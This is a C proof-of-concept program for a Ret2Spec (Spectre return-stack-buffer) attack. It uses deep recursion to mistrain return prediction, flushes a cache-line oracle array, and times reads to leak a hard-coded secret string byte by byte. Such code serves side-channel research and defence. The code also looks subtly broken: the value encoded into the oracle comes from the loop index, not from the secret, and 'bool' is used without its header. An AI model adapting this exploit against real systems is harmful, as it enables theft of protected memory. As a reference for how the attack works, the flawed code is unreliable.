#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "measurereadlatency.h"  // External assembly function for timing cache reads

#define CACHE_LINE_SIZE 64
#define PAGE_SIZE 4096
#define ORACLE_SIZE 256
#define MAX_RUNS 100000
#define K_RECURSION_DEPTH 30

// Oracle byte array aligned to cache lines
typedef struct {
    uint8_t byte[CACHE_LINE_SIZE];
} BigByte;

typedef struct {
    BigByte oracles_[ORACLE_SIZE];
} OracleArray;

static OracleArray oracle;
static int scores[ORACLE_SIZE] = {0};

extern const char *private_data;
size_t current_offset;

// Externally implemented functions
void FlushDataCacheLineNoBarrier(const void *addr);
void MemoryAndSpeculationBarrier();
void ForceRead(const void *addr);

// New global: speculative tag for RSB depth
volatile int speculative_tag = -1;

// Flush memory cache lines from [start, end)
void FlushFromDataCache(const void *start, const void *end) {
    uintptr_t p = (uintptr_t)start;
    uintptr_t stop = (uintptr_t)end;
    for (; p < stop; p += CACHE_LINE_SIZE) {
        FlushDataCacheLineNoBarrier((const void*)p);
    }
    MemoryAndSpeculationBarrier();
}

// Flush the oracle from cache before measurement
void FlushOracle() {
    for (int i = 0; i < ORACLE_SIZE; ++i) {
        FlushDataCacheLineNoBarrier(&oracle.oracles_[i]);
    }
    MemoryAndSpeculationBarrier();
}

// Measure which oracle entry was cached by speculative access
char RecomputeScores(char safe_char) {
    uint64_t latencies[ORACLE_SIZE] = {0};

    for (int i = 0; i < ORACLE_SIZE; ++i) {
        int mix_i = (i * 167 + 13) & 0xFF;
        latencies[mix_i] = MeasureReadLatency(&oracle.oracles_[mix_i]);
    }

    uint64_t safe_latency = latencies[(unsigned char)safe_char];
    int best = -1, best_score = 0;

    for (int i = 0; i < ORACLE_SIZE; ++i) {
        if (latencies[i] < safe_latency && i != (unsigned char)safe_char) {
            scores[i]++;
            if (scores[i] > best_score) {
                best_score = scores[i];
                best = i;
            }
        }
    }

    if (best >= 0) {
        printf("⏪ RSB Tag Leaked (Oracle Index): %d\n", best);
    }
    return (char)best;
}

// Globals for controlling recursion behavior
bool false_value = 0;
void (*return_true_base_case)();
void (*return_false_base_case)();

char *stack_marks[256];
int stack_index = 0;

// Recursion used to overwrite RSB
void ReturnsFalse(int depth) {
    if (depth > 0) {
        ReturnsFalse(depth - 1);
    } else {
        // Speculatively access oracle using speculative tag
        if (speculative_tag >= 0 && speculative_tag < ORACLE_SIZE) {
            ForceRead(&oracle.oracles_[speculative_tag]);
        }
        return_true_base_case();
    }
}

// Recursion used to push return addresses into RSB
void ReturnsTrue(int depth) {
    char mark;
    stack_marks[stack_index++] = &mark;

    if (depth > 0) {
        ReturnsTrue(depth - 1);
    } else {
        // Tag the current RSB entry by writing to speculative_tag
        // Use the current_offset (leak index) + depth as unique tag
        speculative_tag = (int)(current_offset & 0xFF);  // or: (depth & 0xFF) for per-depth tracking
        return_false_base_case();  // Causes speculative return misprediction
    }

    stack_index--;
    FlushFromDataCache(&mark, stack_marks[stack_index]);
}

// Attempts to leak one byte using speculative execution and cache timing
char Ret2SpecLeakByte() {
    for (int run = 0; run < MAX_RUNS; ++run) {
        FlushOracle();

        char mark;
        stack_marks[0] = &mark;
        stack_index = 1;

        ReturnsTrue(K_RECURSION_DEPTH);
        stack_index = 0;

        char leaked = RecomputeScores((char)(run & 0xFF));
        if (scores[(unsigned char)leaked] > 3) {
            return leaked;
        }
    }

    fprintf(stderr, "Failed to converge\n");
    exit(1);
}

// No-op base case for ReturnsFalse
void NopFunction() {}
void ReturnsFalseStart() { ReturnsFalse(K_RECURSION_DEPTH); }

// Secret string to leak
const char *private_data = "It's a s3kr3t!!!";

// Main function: leak and print each byte of secret
int main() {
    return_true_base_case = NopFunction;
    return_false_base_case = ReturnsFalseStart;

    printf("Leaking secret: ");
    for (size_t i = 0; i < strlen(private_data); ++i) {
        current_offset = i;
        char c = Ret2SpecLeakByte();
        printf("%c", c);
        fflush(stdout);
    }

    printf("\nDone.\n");
    return 0;
}
